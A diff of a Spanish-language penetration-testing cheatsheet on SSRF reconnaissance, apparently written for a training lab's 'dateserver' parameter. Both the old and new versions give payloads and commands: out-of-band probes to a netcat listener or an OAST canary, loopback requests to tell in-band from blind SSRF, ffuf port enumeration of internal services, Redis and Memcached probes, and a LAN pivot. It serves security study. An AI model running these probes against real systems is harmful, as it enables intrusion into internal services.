@@ -1,5 +1,5 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/ssrf
@@ -7,8 +7,8 @@ tags:
   - asset/web-app
 kind: SubCheatSheet
 linked:
-  - "[[Server-Side Request Forgery (SSRF)]]"
-  - "[[SSRF - CWES]]"
+  - '[[Server-Side Request Forgery (SSRF)]]'
+  - '[[SSRF - CWES]]'
 ---
 # SSRF - Reconocimiento
 
@@ -16,44 +16,63 @@ linked:
 
 ## Cheatsheet
 
-|**Etapa**|**Objetivo**|**Acción / Payload**|**Indicador de Éxito / Resultado**|
-|---|---|---|---|
-|**1. Identificación**|Detectar parámetros sospechosos.|Observar peticiones HTTP (ej. en [[Burp Suite]]). Buscar parámetros que acepten URLs o nombres de host (ej. `dateserver`).|La aplicación procesa la solicitud y devuelve información basada en el parámetro.|
-|**2. Confirmación (Out-of-Band)**|Verificar si el servidor realiza peticiones externas.|**Payload:** `http://<MI_IP>:8000/ssrf`<br><br>  <br><br>**Listener:** `nc -lnvp 8000`|Se recibe una conexión HTTP en el listener de `netcat` proveniente del servidor objetivo.|
-|**3. Verificación de Respuesta**|Determinar si es Blind SSRF o si hay retorno visual.|**Payload:** `http://127.0.0.1/index.php` (o la misma URL de la app).|La respuesta HTTP contiene el código HTML de la propia aplicación. Si se ve el contenido, **no** es Blind SSRF.|
-|**4. Enumeración de Puertos**|Escanear servicios internos en el servidor (localhost).|Utilizar el SSRF para apuntar a `http://127.0.0.1:<PUERTO>`.|Diferencia en la respuesta entre puertos abiertos y cerrados (ej. mensaje de error vs. código 200/404 o contenido vacío).|
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `nc -lnvp 8000` | Listener OOB local — captura conexión del backend | Confirmación inicial OOB. |
+| `dateserver=http://YOUR_IP:8000/ssrf` (en POST) | Backend conecta a tu listener → SSRF confirmado | Test out-of-band canónico. |
+| `dateserver=http://127.0.0.1/index.php` (en POST) | Página propia del backend reflejada en response | Discriminar In-Band vs Blind. |
+| `dateserver=http://CANARY.oast.fun/probe` | DNS + HTTP hit en Collaborator | Alternativa sin abrir puerto local. |
+| `seq 1 10000 > ports.txt` | Wordlist de puertos 1-10000 | Setup pre-fuzz. |
+| `ffuf -w ports.txt -u http://TARGET/index.php -X POST -d 'dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01' -fr 'Failed to connect to'` | Lista de puertos internos abiertos | Port enum via SSRF. |
+| `ffuf -w ports.txt -u ... -mr 'banner\|SSH\|HTTP'` | Filtra puertos con banner detectable | Service fingerprinting. |
+| `dateserver=http://127.0.0.1:22/` | Banner SSH si abierto | Single-port probe. |
+| `dateserver=http://127.0.0.1:6379/info` | Output `INFO` de Redis sin auth | Detección Redis interno. |
+| `dateserver=http://127.0.0.1:11211/stats` | Stats Memcached | Memcached sin auth. |
+| `dateserver=http://192.168.1.1/` | Pivot a host LAN | Discovery cross-host. |
 ^ssrf-reconocimiento
 
-## Automatización con FFUF
+### Workflow
 
-Para la etapa de enumeración de puertos internos, es eficiente utilizar [[Fuzzing]] para iterar sobre un rango de puertos y filtrar las respuestas que indican conexión fallida.
+```bash
+# 1. Listener OOB
+nc -lnvp 8000 &
 
-### Generación de Wordlist
+# 2. Probe SSRF out-of-band
+curl -X POST http://TARGET/index.php \
+  -d 'dateserver=http://YOUR_IP:8000/ssrf&date=2024-01-01'
+# → conexión en netcat = SSRF confirmado
 
-Primero generamos una lista de puertos (ej. los primeros 10,000):
-```Bash
+# 3. Confirmar In-Band vs Blind
+curl -X POST http://TARGET/index.php \
+  -d 'dateserver=http://127.0.0.1/index.php&date=2024-01-01'
+# Si la respuesta contiene HTML del backend → In-Band; sino → [[SSRF - Blind SSRF]]
+
+# 4. Port enum interno con FFUF
 seq 1 10000 > ports.txt
-```
-
-### Ejecución del Fuzzer
-
-Utilizamos `ffuf` inyectando el punto de fuzzing (`FUZZ`) en el puerto de la URL interna. Filtramos las respuestas que contienen el mensaje de error conocido (ej. "Failed to connect").
-```Bash
-ffuf -w ./ports.txt \
-     -u http://<TARGET_IP>/index.php \
+ffuf -w ports.txt \
+     -u http://TARGET/index.php \
      -X POST \
-     -H "Content-Type: application/x-www-form-urlencoded" \
-     -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
-     -fr "Failed to connect to"
+     -H 'Content-Type: application/x-www-form-urlencoded' \
+     -d 'dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01' \
+     -fr 'Failed to connect to'
+
+# 5. Banner grab por puerto descubierto
+for p in 22 80 3306 6379 8080 11211; do
+  echo "=== $p ==="
+  curl -s -X POST http://TARGET/index.php \
+    -d "dateserver=http://127.0.0.1:$p/&date=2024-01-01" | head -c 200
+done
 ```
 
-**Parámetros clave:**
-- `-w`: Archivo de lista de puertos.
-- `-d`: Datos del POST donde inyectamos el payload SSRF (`http://127.0.0.1:FUZZ/`).
-- `-fr`: Filter Regex. Filtra (oculta) las respuestas que coinciden con el error de conexión, dejando visibles solo los puertos abiertos.
+___
 
-### Resultados Comunes
+## Overview
 
-- **Puerto 80:** Servidor web interno.
-- **Puerto 3306:** Base de datos [[MySQL]].
-- **Otros servicios:** Paneles de administración internos o APIs no expuestas públicamente.
+Reconocimiento SSRF = 3 etapas:
+1. **Confirmar** que el backend hace fetch (OOB con netcat/Collaborator).
+2. **Discriminar In-Band vs Blind** apuntando a la propia app — si refleja contenido → In-Band.
+3. **Port enum** de loopback con FFUF + filtro de error connection-refused.
+
+Resultados comunes en port enum: 80 (web interno), 3306 (MySQL), 6379 (Redis), 8080 (admin), 11211 (Memcached), 8500 (Consul), 9200 (Elasticsearch).
+
+***
